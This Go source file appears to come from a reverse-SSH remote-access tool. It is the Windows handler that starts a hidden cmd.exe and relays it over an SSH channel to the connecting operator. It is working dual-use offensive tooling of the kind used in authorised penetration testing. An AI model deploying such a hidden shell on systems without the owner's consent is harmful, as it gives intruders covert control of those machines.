// +build windows
package client

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"os/signal"
	"syscall"

	"github.com/NHAS/reverse_ssh/internal/server/terminal"
	"github.com/NHAS/reverse_ssh/internal/server/users"
	"github.com/NHAS/reverse_ssh/pkg/logger"
	"golang.org/x/crypto/ssh"
)

//The basic windows shell handler, as there arent any good golang libraries to work with windows conpty
func shellChannel(user *users.User, newChannel ssh.NewChannel, log logger.Logger) {

	c := make(chan os.Signal, 1)
	expected := make(chan bool, 1)

	signal.Notify(c, os.Interrupt)
	signal.Notify(c, syscall.SIGTERM)

	go func() {
		for {
			select {
			case <-c:
				os.Exit(0)
			case <-expected:
				<-c

			}
		}
	}()
	// At this point, we have the opportunity to reject the client's.
	// request for another logical connection
	connection, requests, err := newChannel.Accept()
	if err != nil {
		log.Error("Could not accept channel (%s)", err)
		return
	}
	defer connection.Close()

	go func() {
		defer connection.Close()

		cmd := exec.Command("cmd.exe")
		cmd.SysProcAttr = &syscall.SysProcAttr{
			HideWindow:    true,
			CreationFlags: syscall.STARTF_USESTDHANDLES,
		}

		stdout, err := cmd.StdoutPipe()
		if err != nil {
			log.Error("%s", err)
			return
		}

		cmd.Stderr = cmd.Stdout

		stdin, err := cmd.StdinPipe()
		if err != nil {
			log.Error("%s", err)
			return
		}

		term := terminal.NewTerminal(connection, "")

		go func() {

			buf := make([]byte, 128)

			for {

				n, err := stdout.Read(buf)
				if err != nil {
					if err != io.EOF {
						log.Error("%s", err)
					}
					return
				}

				_, err = term.Write(buf[:n])
				if err != nil {
					log.Error("%s", err)
					return
				}

			}
		}()

		go func() {

			for {
				//This will break if the user does CTRL+D apparently we need to reset the whole terminal if a user does this.... so just exit instead
				line, err := term.ReadLine()
				if err != nil && err != terminal.ErrCtrlC {
					log.Error("%s", err)
					return
				}

				if err == terminal.ErrCtrlC {
					expected <- true
					err := sendCtrlC(cmd.Process.Pid)
					if err != nil {
						fmt.Fprintf(term, "Failed to send Ctrl +C sorry! You are most likely trapped: %s", err)
						log.Error("%s", err)
					}
				}

				if err == nil {
					stdin.Write([]byte(line + "\r\n"))
				}

			}

		}()

		err = cmd.Run()
		if err != nil {
			log.Error("%s", err)
		}

	}()

	for req := range requests {
		log.Info("Got request: %s", req.Type)
		switch req.Type {
		case "shell":
			// We only accept the default shell
			// (i.e. no command in the Payload)
			req.Reply(len(req.Payload) == 0, nil)

		case "pty-req":
			req.Reply(true, nil)
		}
	}

}

func sendCtrlC(pid int) error {

	d, e := syscall.LoadDLL("kernel32.dll")

	if e != nil {

		return fmt.Errorf("LoadDLL: %v\n", e)

	}

	p, e := d.FindProc("GenerateConsoleCtrlEvent")

	if e != nil {

		return fmt.Errorf("FindProc: %v\n", e)

	}
	r, _, e := p.Call(syscall.CTRL_C_EVENT, uintptr(pid))

	if r == 0 {

		return fmt.Errorf("GenerateConsoleCtrlEvent: %v\n", e)

	}

	return nil

}
